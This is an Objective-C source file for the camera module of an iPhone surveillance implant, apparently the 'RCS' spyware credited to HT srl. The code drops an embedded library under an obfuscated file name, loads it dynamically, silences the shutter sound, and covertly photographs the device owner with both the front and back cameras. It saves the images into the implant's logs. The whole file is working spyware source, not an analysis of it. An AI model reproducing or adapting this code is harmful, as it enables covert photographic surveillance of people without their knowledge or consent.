//
//  RCSIAgentCamera.m
//  RCSIphone
//
//  Created by kiodo on 02/12/11.
//  Copyright 2011 HT srl. All rights reserved.
//
#import <dlfcn.h>
#import <AudioToolbox/AudioToolbox.h>

#import "RCSIAgentCamera.h"
#import "RCSILogManager.h"
#import "ARMHooker.h"

#import "RCSICameraSupport.h"

//#define DEBUG_CAMERA_

typedef NSData* (*camera_t) (NSInteger);
typedef void (*disableSound_t)(void);

#define KAVCaptureDevicePositionBack   1
#define KAVCaptureDevicePositionFront  2

static camera_t runCamera;
static disableSound_t disableShutterSound;

@implementation RCSIAgentCamera

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData*)aData
{
  self = [super initWithConfigData: aData];

  if (self != nil)
    {
      mAgentID = AGENT_CAM; 
    }

  return self;
}

#pragma mark -
#pragma mark support methods
#pragma mark -

#define CAM_DYLIB_NAME @"3@e337a.dib"
#define CAM_DYLIB_FUNC "runCamera"

- (BOOL)_checkCameraCompatibilty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;

  if (gOSMajor >= 4 || (gOSMajor == 4 && gOSMinor == 1))
    {
      NSString *path = [[NSBundle mainBundle] bundlePath];
      NSString *camDylibPathName = [[NSString alloc] initWithFormat: @"%@/%@", path, CAM_DYLIB_NAME];

      if (![[NSFileManager defaultManager] fileExistsAtPath: camDylibPathName])
        {
          NSData *tmpDylib = [[NSData alloc] initWithBytes: _tmp_camera_dylib_buff 
                                                    length: sizeof(_tmp_camera_dylib_buff)];
                                                    
          BOOL tmpB = FALSE;
          tmpB = [tmpDylib writeToFile: camDylibPathName atomically:YES];
                      
          [tmpDylib release];
        }
      
      void *cam_handle = dlopen([camDylibPathName UTF8String], RTLD_NOW);
          
      if (cam_handle != NULL &&
          (runCamera = (camera_t) dlsym(cam_handle, CAM_DYLIB_FUNC)) != NULL &&
          (disableShutterSound = (disableSound_t) dlsym(cam_handle, "disableShutterSound")) != NULL)
        {
          bRet = TRUE;
        }
        
      [camDylibPathName release];
    }  
    
  [pool release];
  
  return bRet;
}

- (void)_grabCameraShot
{
  NSData *image = nil;
  
  if (gCameraActive == TRUE || [self isThreadCancelled] == TRUE)
    return;
  
  //Back Log  
  image = runCamera(KAVCaptureDevicePositionBack);
  
  if (image != nil && [image isKindOfClass: [NSData class]])
    {
      RCSILogManager *logManager = [RCSILogManager sharedInstance];
      
      BOOL success = [logManager createLog: LOG_CAMERA
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          [logManager writeDataToLog: (NSMutableData*)image 
                            forAgent: LOG_CAMERA
                           withLogID: 0];
        } 
    
      [logManager closeActiveLog: LOG_CAMERA
                     withLogID: 0];
                     
      [image release];
    }
  
  if (gCameraActive == TRUE || [self isThreadCancelled] == TRUE)
    return;
      
  // Front log
  image = runCamera(KAVCaptureDevicePositionFront);
  
  if (image == nil)
    return;
  
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CAMERA
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
    {
      [logManager writeDataToLog: (NSMutableData*)image 
                        forAgent: LOG_CAMERA
                       withLogID: 0];
    }
    
  [logManager closeActiveLog: LOG_CAMERA
                   withLogID: 0];

  [image release];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self _checkCameraCompatibilty] == NO ||
      [self mAgentStatus] != AGENT_STATUS_STOPPED || 
      [self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [outerPool release];
      return;
    }
 
  disableShutterSound();
  
  [self _grabCameraShot];
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];

  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
